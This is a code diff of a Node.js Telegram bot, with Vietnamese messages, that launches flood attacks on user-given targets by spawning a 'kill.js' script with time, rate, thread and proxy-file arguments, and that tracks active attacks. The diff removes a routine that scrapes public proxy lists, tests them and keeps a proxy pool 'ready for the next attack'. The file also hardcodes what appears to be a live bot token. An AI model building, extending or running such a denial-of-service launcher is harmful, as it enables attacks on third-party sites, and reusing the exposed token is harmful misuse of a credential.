@@ -2,8 +2,6 @@ const TelegramBot = require('node-telegram-bot-api')
 const { spawn } = require('child_process')
 const express = require('express')
 const si = require('systeminformation')
-const fs = require('fs').promises
-const axios = require('axios')
 
 const TOKEN = '7937745403:AAGrQ_OVQalmt2tzz6XJBtDDcD-YN-gATu8'
 const ADMIN_IDS = [6601930239]
@@ -16,84 +14,6 @@ app.get('/', (req, res) => res.send('Bot is running'))
 app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
 
 const activeAttacks = {}
-const PROXY_FILE = './prx.txt'
-const MIN_PROXIES = 240
-
-async function checkProxy(proxy) {
-  try {
-    const [ip, port] = proxy.split(':')
-    if (!ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/) || isNaN(port)) return false
-    const response = await axios.get('https://api.ipify.org', {
-      proxy: { host: ip, port: parseInt(port) },
-      timeout: 5000
-    })
-    return response.status === 200
-  } catch {
-    return false
-  }
-}
-
-async function fetchProxies() {
-  const sources = [
-    'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text',
-    'https://openproxylist.xyz/http.txt',
-    'https://proxyspace.pro/http.txt',
-    'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt',
-    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
-  ]
-  let proxies = []
-  for (const source of sources) {
-    try {
-      const response = await axios.get(source, { timeout: 10000 })
-      const lines = response.data.split('\n').map(line => line.trim()).filter(line => line.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/))
-      proxies.push(...lines)
-    } catch {}
-  }
-  return [...new Set(proxies)]
-}
-
-async function scanProxies(chatId) {
-  bot.sendMessage(chatId, 'Tiến hành kiểm tra nghiêm ngặt các proxy. ⚡\n-> Giữ proxy sống\n-> Vứt proxy chết', { parse_mode: 'Markdown' })
-  
-  let proxies = []
-  try {
-    const data = await fs.readFile(PROXY_FILE, 'utf8')
-    proxies = data.split('\n').map(line => line.trim()).filter(line => line.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/))
-  } catch {
-    proxies = []
-  }
-
-  const total = proxies.length
-  const results = await Promise.all(proxies.map(proxy => checkProxy(proxy)))
-  const liveProxies = proxies.filter((_, i) => results[i])
-  const liveCount = liveProxies.length
-
-  let finalProxies = liveProxies
-  if (liveCount < MIN_PROXIES) {
-    bot.sendMessage(chatId, `Proxy sống dưới ${MIN_PROXIES} (${liveCount}). Tiến hành lấy và kiểm tra proxy mới... ⚡`, { parse_mode: 'Markdown' })
-    const newProxies = await fetchProxies()
-    const newResults = await Promise.all(newProxies.map(proxy => checkProxy(proxy)))
-    const newLiveProxies = newProxies.filter((_, i) => newResults[i])
-    finalProxies = [...new Set([...liveProxies, ...newLiveProxies])]
-  }
-
-  const finalCount = finalProxies.length
-  finalProxies = finalProxies.slice(0, Math.max(MIN_PROXIES, finalCount))
-  await fs.writeFile(PROXY_FILE, finalProxies.join('\n'))
-  
-  const deadCount = total - liveCount
-  const livePercent = finalCount > 0 ? (finalCount / finalCount * 100).toFixed(2) : 0
-
-  bot.sendMessage(chatId, 
-    `Tổng số proxy trong file ${PROXY_FILE}: ${finalCount}\n` +
-    `-> Số proxy sống: ${finalCount}/${finalCount}\n` +
-    `-> Số proxy chết: ${deadCount}/${total || deadCount}\n\n` +
-    `Sẵn sàng cho lần tấn công tiếp theo với các proxy sống đến ${livePercent}%. ✅`, 
-    { parse_mode: 'Markdown' }
-  )
-}
-
-setInterval(() => scanProxies(ADMIN_IDS[0]), 3600000)
 
 bot.onText(/\/system/, async (msg) => {
   const chatId = msg.chat.id
@@ -113,16 +33,6 @@ bot.onText(/\/system/, async (msg) => {
   } catch (err) {
     bot.sendMessage(chatId, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
-})
-
-bot.onText(/\/scanproxy/, async (msg) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  if (!ADMIN_IDS.includes(userId)) {
-    bot.sendMessage(chatId, '```json\n' + JSON.stringify({ error: "Permission denied" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
-    return
-  }
-  await scanProxies(chatId)
 })
 
 bot.on('message', (msg) => {
@@ -158,7 +68,7 @@ bot.on('message', (msg) => {
       return
     }
 
-    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, PROXY_FILE])
+    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'])
     const attackId = `${userId}_${Date.now()}`
     activeAttacks[attackId] = { cmd, target, time, rate, thread, userId }
 
